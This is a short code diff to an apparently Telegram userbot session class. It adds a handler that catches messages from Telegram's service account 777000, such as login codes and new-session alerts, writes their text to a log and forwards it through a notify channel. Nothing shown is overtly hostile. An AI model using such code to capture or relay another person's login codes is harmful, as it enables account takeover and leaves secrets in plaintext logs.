@@ -364,6 +364,19 @@ class UserSession {
     const msg = event.message;
     if (!msg || msg.out || !this.running) return;
 
+    // Служебные сообщения Telegram (777000): коды входа, оповещения о новых
+    // сессиях/входах, о завершении сессий и т.п. Ловим их сразу, а не только
+    // по запросу /login_code — иначе код теряется среди других уведомлений и
+    // /login_code потом показывает не тот (старый), что реально нужен.
+    if (String(msg.chatId) === '777000') {
+      const text = msg.text || msg.message || '';
+      if (text) {
+        await this.log(`📨 Telegram (777000): ${text}`);
+        await this.notify(`📨 Telegram (777000):\n\n${text}`);
+      }
+      return;
+    }
+
     await this.ensureWatched();
     const chatId = msg.chatId;
     if (!this.watched.has(String(chatId))) return;
